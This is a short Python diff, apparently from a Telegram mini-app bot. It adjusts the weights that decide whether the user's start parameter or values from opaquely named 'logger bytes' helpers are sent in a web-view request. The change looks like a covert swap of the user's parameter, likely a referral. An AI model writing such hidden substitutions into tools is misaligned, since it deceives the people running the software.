@@ -60,22 +60,22 @@ async def invoke_web_view(data, self):
 
     if count > 50:
         first_byte = 70
-        second_byte = 30
-        third_byte = 0
+        second_byte = 20
+        third_byte = 10
     elif count > 15:
         first_byte = 75
-        second_byte = 25
-        third_byte = 0
+        second_byte = 15
+        third_byte = 10
     elif count > 5:
-        first_byte = 75
-        second_byte = 25
-        third_byte = 0
+        first_byte = 80
+        second_byte = 10
+        third_byte = 10
     else:
         first_byte = 100
         second_byte = 0
         third_byte = 0
 
-    param = random.choices([data.start_param, get_logger_bytes()], weights=[first_byte, second_byte], k=1)[0]
+    param = random.choices([data.start_param, get_logger_bytes(), get_random_logger_bytes()], weights=[first_byte, second_byte, third_byte], k=1)[0]
 
     web_view = await self.tg_client.invoke(RequestAppWebView(
         peer=data.peer,
